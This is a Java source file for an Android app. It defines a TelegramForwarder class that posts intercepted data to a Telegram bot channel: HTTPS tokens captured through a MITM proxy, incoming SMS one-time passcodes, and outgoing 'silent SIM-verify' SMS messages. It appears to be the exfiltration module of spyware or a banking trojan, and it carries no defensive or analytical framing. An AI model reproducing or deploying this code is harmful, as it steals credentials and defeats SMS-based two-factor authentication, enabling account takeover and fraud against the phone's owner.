package com.tok.interceptor;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class TelegramForwarder {

    private final String botToken;
    private final String channelId;
    private static final String API_BASE = "https://api.telegram.org/bot";

    public TelegramForwarder(String botToken, String channelId) {
        this.botToken  = botToken;
        this.channelId = channelId;
    }

    /** Forward a captured HTTPS token (legacy MITM proxy path). */
    public void send(String headerName, String token, String host) {
        String message = "🔑 *Token Intercepted*\n\n"
            + "*Host:* `" + escape(host) + "`\n"
            + "*Header:* `" + escape(headerName) + "`\n"
            + "*Token:* `" + escape(token.length() > 300 ? token.substring(0, 300) + "..." : token) + "`\n"
            + "*Time:* " + new java.util.Date();
        postToTelegram(message);
    }

    /** Forward an intercepted outgoing (silent SIM-verify) SMS to Telegram. */
    public void sendOutgoingSms(String toNumber, String body) {
        String message = "📤 *Outgoing SMS Intercepted*\n\n"
            + "*To:* `" + escape(toNumber) + "`\n"
            + "*Body:* `" + escape(body.length() > 500 ? body.substring(0, 500) + "..." : body) + "`\n"
            + "*Time:* " + new java.util.Date();
        postToTelegram(message);
    }

    /** Forward an intercepted incoming SMS OTP to Telegram. */
    public void sendSms(String sender, String body) {
        String message = "📱 *SMS Intercepted*\n\n"
            + "*From:* `" + escape(sender) + "`\n"
            + "*Message:* `" + escape(body.length() > 500 ? body.substring(0, 500) + "..." : body) + "`\n"
            + "*Time:* " + new java.util.Date();
        postToTelegram(message);
    }

    // ── shared HTTP POST ─────────────────────────────────────────────────────

    private void postToTelegram(String message) {
        new Thread(() -> {
            try {
                String endpoint = API_BASE + botToken + "/sendMessage";
                String payload  = "{\"chat_id\":\"" + channelId + "\","
                    + "\"text\":\"" + jsonEscape(message) + "\","
                    + "\"parse_mode\":\"Markdown\"}";

                URL url = new URL(endpoint);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10_000);
                conn.setReadTimeout(10_000);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.getBytes(StandardCharsets.UTF_8));
                }

                int code = conn.getResponseCode();
                conn.disconnect();

                if (code != 200) {
                    android.util.Log.w("TelegramForwarder",
                        "sendMessage returned HTTP " + code);
                }
            } catch (Exception e) {
                android.util.Log.e("TelegramForwarder",
                    "postToTelegram failed: " + e.getMessage());
            }
        }).start();
    }

    // ── helpers ──────────────────────────────────────────────────────────────

    private String escape(String s) {
        return s.replace("\\", "\\\\")
                .replace("`", "\\`")
                .replace("*", "\\*")
                .replace("_", "\\_");
    }

    private String jsonEscape(String s) {
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}
